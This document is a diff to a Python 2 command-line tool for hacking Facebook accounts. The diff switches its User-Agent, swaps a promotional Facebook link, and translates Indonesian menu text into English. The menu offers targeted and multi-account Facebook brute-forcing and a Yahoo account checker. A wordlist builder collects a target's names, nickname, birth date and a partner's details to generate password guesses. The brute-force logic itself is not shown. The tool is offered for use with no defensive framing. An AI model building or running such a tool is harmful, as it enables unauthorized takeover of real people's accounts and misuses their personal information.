@@ -21,7 +21,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; U; Android-4.0.3; en-us; Galaxy Nexus Build/IML74K) AppleWebKit/535.7 (KHTML, like Gecko) CrMo/16.0.912.75 Mobile Safari/535.7')]
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0')]
 
 #-exit-#
 def exit():
@@ -269,7 +269,7 @@ def choices():
 		os.remove('out')
 	elif pick =="9":
 		os.system('rm -rf login.txt')
-		os.system('xdg-open https://www.facebook.com/rizz.magizz')
+		os.system('xdg-open https://www.facebook.com/learntermux1linux1/')
 		exit()
 	elif pick =="0":
 		exit()
@@ -935,11 +935,11 @@ def menu_hack():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Multi Bruteforce Facebook"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Super Multi Bruteforce Facebook"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m BruteForce(\033[1;92mTarget\033[1;97m)"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Yahoo Checker"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Simple Facebook Hack(\033[1;92mTarget\033[1;97m)"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Facebook Multi Bruteforce"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Strong Facebook Multi Bruteforce "
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Facebook BruteForce(\033[1;92mTarget\033[1;97m)"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Yahoo Check"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	choose_hack()
@@ -2348,20 +2348,20 @@ def wordlist():
 		print logo
 		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
 		print 42*"\033[1;97m═"
-		a = raw_input("\033[1;91m[+] \033[1;92mfb_name Depan \033[1;97m: ")
+		a = raw_input("\033[1;91m[+] \033[1;92mfb_name first \033[1;97m: ")
 		file = open(a+".txt", 'w')
-		b=raw_input("\033[1;91m[+] \033[1;92mfb_name Tengah \033[1;97m: ")
-		c=raw_input("\033[1;91m[+] \033[1;92mfb_name Belakang \033[1;97m: ")
-		d=raw_input("\033[1;91m[+] \033[1;92mfb_name Panggilan \033[1;97m: ")
-		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
+		b=raw_input("\033[1;91m[+] \033[1;92mfb_name middle \033[1;97m: ")
+		c=raw_input("\033[1;91m[+] \033[1;92mfb_name last \033[1;97m: ")
+		d=raw_input("\033[1;91m[+] \033[1;92mfb_name nicke \033[1;97m: ")
+		e=raw_input("\033[1;91m[+] \033[1;92mDate of birth >\033[1;96mex: |DDMMYY| \033[1;97m: ")
 		f=e[0:2]
 		g=e[2:4]
 		h=e[4:]
 		print 42*"\033[1;97m═"
-		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
-		i=raw_input("\033[1;91m[+] \033[1;92mfb_name Pacar \033[1;97m: ")
-		j=raw_input("\033[1;91m[+] \033[1;92mfb_name Panggilan Pacar \033[1;97m: ")
-		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
+		print("\033[1;91m[?] \033[1;93mcreate wordlist :v")
+		i=raw_input("\033[1;91m[+] \033[1;92mfb_name first \033[1;97m: ")
+		j=raw_input("\033[1;91m[+] \033[1;92mfb_name last \033[1;97m: ")
+		k=raw_input("\033[1;91m[+] \033[1;92mdate of birth >\033[1;96mex: |DDMMYY| \033[1;97m: ")
 		mkdir('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
 		l=k[0:2]
 		m=k[2:4]
